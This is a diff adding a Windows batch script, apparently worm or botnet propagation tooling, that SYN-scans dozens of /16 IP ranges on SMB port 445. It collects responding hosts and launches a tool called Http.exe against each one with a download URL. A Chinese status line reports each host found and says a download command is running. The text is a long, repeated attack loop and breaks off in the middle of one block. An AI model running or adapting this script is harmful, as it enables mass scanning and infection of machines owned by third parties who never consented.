@@ -1,0 +1,1784 @@
+@echo off 
+cls&s syn 103.15.0.0 103.15.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.226.0.0 103.226.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.227.0.0 103.227.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.228.0.0 103.228.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.229.0.0 103.229.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.235.0.0 103.235.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.24.0.0 103.24.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.242.0.0 103.242.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.243.0.0 103.243.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.244.0.0 103.244.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.246.0.0 103.246.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.252.0.0 103.252.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.255.0.0 103.255.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.27.0.0 103.27.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.30.0.0 103.30.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 103.31.0.0 103.31.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 106.186.0.0 106.186.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 107.150.0.0 107.150.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 108.186.0.0 108.186.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 110.34.0.0 110.34.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 111.67.0.0 111.67.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 111.73.0.0 111.73.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 112.101.0.0 112.101.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 112.124.0.0 112.124.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 112.213.0.0 112.213.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 113.10.0.0 113.10.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 113.107.0.0 113.107.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 113.11.0.0 113.11.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 114.80.0.0 114.80.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.126.0.0 115.126.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.230.0.0 115.230.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.231.0.0 115.231.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.236.0.0 115.236.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.239.0.0 115.239.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.28.0.0 115.28.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.29.0.0 115.29.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 115.47.0.0 115.47.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 116.212.0.0 116.212.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 116.255.0.0 116.255.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 117.18.0.0 117.18.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 117.27.0.0 117.27.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 118.123.0.0 118.123.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 118.193.0.0 118.193.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 118.213.0.0 118.213.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 118.244.0.0 118.244.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 118.67.0.0 118.67.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 118.99.0.0 118.99.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 119.28.0.0 119.28.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 121.127.0.0 121.127.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 121.40.0.0 121.40.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 121.52.0.0 121.52.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 122.10.0.0 122.10.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 122.114.0.0 122.114.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 122.225.0.0 122.225.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 123.108.0.0 123.108.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 123.183.0.0 123.183.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 123.249.0.0 123.249.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 124.232.0.0 124.232.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 124.248.0.0 124.248.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 125.65.0.0 125.65.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
